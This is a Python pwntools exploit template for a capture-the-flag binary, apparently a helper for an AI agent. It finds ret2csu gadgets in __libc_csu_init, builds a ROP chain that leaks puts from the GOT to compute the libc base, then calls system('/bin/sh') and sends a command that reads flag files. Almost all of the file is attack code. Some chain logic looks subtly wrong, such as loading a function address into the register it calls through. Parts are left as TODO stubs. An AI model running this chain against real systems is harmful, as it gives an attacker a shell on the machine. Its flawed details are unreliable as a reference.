#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
LIBC = os.getenv("LIBC", "./libc.so.6")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
OFFSET = int(os.getenv("OFFSET", "0"))
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None
context.log_level = os.getenv("LOG", "info")

def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


# Find __libc_csu_init gadgets
# These are the classic ret2csu gadgets found in most x86_64 binaries
csu_init_addr = elf.sym.get("__libc_csu_init")
if not csu_init_addr:
    log.warning("__libc_csu_init not found - binary may be stripped or compiled without it")
    log.info("Try: ROPgadget --binary ./chall | grep 'pop rbx'")
    raise SystemExit("TODO: find alternative gadgets or use different technique")

# Classic __libc_csu_init gadgets
# gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# gadget2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword [r15+rbx*8]
csu_gadget1 = None
csu_gadget2 = None

# Search for gadget patterns
gadget1_pattern = b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget2_pattern = b"\x4c\x89\xf2\x4c\x89\xee\x44\x89\xe7"  # mov rdx, r14; mov rsi, r13; mov edi, r12d

for addr in elf.search(gadget1_pattern):
    csu_gadget1 = addr
    log.info(f"Found csu_gadget1 (pop sequence) at {addr:#x}")
    break

for addr in elf.search(gadget2_pattern):
    csu_gadget2 = addr
    log.info(f"Found csu_gadget2 (mov sequence) at {addr:#x}")
    break

if not csu_gadget1 or not csu_gadget2:
    log.warning("Could not find classic csu gadgets automatically")
    log.info("Try manual search: ROPgadget --binary ./chall | grep -E 'pop rbx|mov rdx, r14'")
    # Try to find them manually from __libc_csu_init
    if csu_init_addr:
        log.info(f"__libc_csu_init at {csu_init_addr:#x} - disassemble to find gadgets")
    raise SystemExit("TODO: manually identify csu gadgets")


def ret2csu(rbx, rbp, r12, r13, r14, r15, call_func=None):
    """
    Build a ret2csu call chain.
    
    Args:
        rbx: 0 (usually)
        rbp: 1 (to pass the cmp/jne check)
        r12: function pointer to call (r15+rbx*8 points to it, or use r12d as edi)
        r13: rsi value (second arg)
        r14: rdx value (third arg)
        r15: pointer to function pointer table (or use r12d directly for edi)
        call_func: if set, call this instead of [r15+rbx*8]
    
    The classic use is:
    - rbx = 0
    - rbp = 1
    - r12 = pointer to GOT entry or function to call
    - r13 = arg1 (moved to rsi)
    - r14 = arg2 (moved to rdx)
    - r15 = pointer to function pointer (moved to edi via r12d)
    
    Actually, the registers work like this in the second gadget:
    - mov rdx, r14 (r14 -> rdx)
    - mov rsi, r13 (r13 -> rsi)  
    - mov edi, r12d (r12d -> edi, low 32 bits of r12)
    - call [r15 + rbx*8]
    
    So for a call like system("/bin/sh"):
    - r12 = address of "/bin/sh" string (will be in edi)
    - r13 = 0 (rsi)
    - r14 = 0 (rdx)
    - r15 = address of system GOT entry (or any pointer to function)
    - rbx = 0
    - rbp = 1
    """
    chain = [
        csu_gadget1,
        rbx, rbp, r12, r13, r14, r15,
        csu_gadget2,
        # Padding for the 7 pops + call after gadget2 returns
        0, 0, 0, 0, 0, 0, 0
    ]
    return chain


# Example: ret2libc using csu to leak and call system
def exploit_ret2libc_csu():
    if not libc:
        log.error("Libc required for ret2libc")
        return
    
    # Step 1: Leak libc using csu to call puts(GOT[puts])
    puts_got = elf.got.get("puts")
    if not puts_got:
        log.error("puts not in GOT")
        return
    
    log.info(f"puts@GOT: {puts_got:#x}")
    
    # Build leak payload using csu
    # We want to call: puts(GOT[puts])
    # r12 = GOT[puts] (will be in edi = first arg)
    # r13, r14 = 0 (rsi, rdx don't matter for puts)
    # r15 = PLT puts or GOT puts (function to call)
    
    main_addr = elf.sym.get("main") or elf.sym.get("_start")
    if not main_addr:
        log.error("Cannot find main or _start for reentry")
        return
    
    # First stage: leak
    payload = flat({
        OFFSET: [
            csu_gadget1,
            0,        # rbx = 0
            1,        # rbp = 1
            puts_got, # r12 -> edi (first arg)
            0,        # r13 -> rsi
            0,        # r14 -> rdx
            puts_got, # r15 -> call [r15+0*8] = puts
            csu_gadget2,
            0, 0, 0, 0, 0, 0, 0,  # padding for pops
            main_addr,  # return to main for second stage
        ]
    })
    
    io = start()
    io.sendline(payload)
    
    # Receive leak
    io.recvuntil(b"\n", timeout=2)
    leak_data = io.recv(6, timeout=2)
    if len(leak_data) < 6:
        leak_data = leak_data.ljust(6, b"\x00")
    
    puts_leak = u64(leak_data.ljust(8, b"\x00"))
    log.info(f"puts leak: {puts_leak:#x}")
    
    # Calculate libc base
    libc.address = puts_leak - libc.sym["puts"]
    log.info(f"libc base: {libc.address:#x}")
    
    # Verify alignment
    if libc.address % 0x1000 != 0:
        log.warning(f"libc base {libc.address:#x} not page-aligned!")
    
    # Second stage: call system("/bin/sh")
    binsh = next(libc.search(b"/bin/sh\x00"))
    system_addr = libc.sym["system"]
    
    payload2 = flat({
        OFFSET: [
            csu_gadget1,
            0,           # rbx = 0
            1,           # rbp = 1
            binsh,       # r12 -> edi (pointer to "/bin/sh")
            0,           # r13 -> rsi
            0,           # r14 -> rdx
            system_addr, # r15 -> call [r15+0*8] = system
            csu_gadget2,
            0, 0, 0, 0, 0, 0, 0,
        ]
    })
    
    io.sendline(payload2)
    
    # Try to get flag
    io.sendline(b"cat flag* 2>/dev/null || cat /flag 2>/dev/null || id")
    emit(io.recvall(timeout=3))


# Alternative: Use csu for arbitrary function call
def csu_call(func_addr, arg1, arg2, arg3):
    """
    Use ret2csu to call func(arg1, arg2, arg3)
    Returns the chain part (without offset padding)
    """
    # We need arg1 in edi, arg2 in rsi, arg3 in rdx
    # gadget2 does: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
    
    # Create a fake GOT entry pointing to our function
    # This is tricky - we need [r15+0] to contain func_addr
    # Alternative: use a writable address we control
    
    # For simplicity, if we have a writable address (like bss), we can:
    # 1. Write func_addr to that address
    # 2. Point r15 to that address
    
    log.info(f"csu_call({func_addr:#x}, {arg1:#x}, {arg2:#x}, {arg3:#x})")
    log.info("TODO: Implement writable address setup for arbitrary csu_call")
    
    # Simplified version assuming we can use a fixed writable address
    # This needs to be adapted per challenge
    writable = elf.bss(0x100)  # Use BSS as writable area
    
    return [
        csu_gadget1,
        0,            # rbx = 0
        1,            # rbp = 1
        arg1,         # r12 -> edi
        arg2,         # r13 -> rsi
        arg3,         # r14 -> rdx
        writable,     # r15 -> call [writable] (need to write func_addr here first)
        csu_gadget2,
        0, 0, 0, 0, 0, 0, 0,
    ]


if __name__ == "__main__":
    log.info("ret2csu helper template loaded")
    log.info(f"csu_gadget1: {csu_gadget1:#x}")
    log.info(f"csu_gadget2: {csu_gadget2:#x}")
    log.info("Use exploit_ret2libc_csu() only after confirming the call target shape with ctf-pwn-ret2csu-check.")
    raise SystemExit("TODO: call the verified ret2csu chain for this binary")
